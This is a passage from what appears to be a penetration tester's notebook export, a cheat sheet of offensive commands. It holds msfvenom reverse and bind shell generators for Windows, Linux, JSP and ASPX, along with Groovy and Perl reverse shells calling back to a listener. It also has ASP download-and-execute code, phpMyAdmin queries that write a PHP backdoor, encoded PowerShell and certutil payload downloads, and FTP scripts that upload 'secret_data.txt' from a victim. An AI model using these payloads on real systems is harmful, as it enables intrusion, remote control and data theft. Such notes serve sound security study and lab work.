          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
        <node name="powershell" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701626719" ts_lastsave="1701626901">
          <rich_text>

</rich_text>
          <rich_text link="webs https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</rich_text>
          <rich_text>

use this


Ex:  `</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`</codebox>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1701639277">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="665" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.14.21/rev.exe rev.exe</codebox>
        </node>
        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

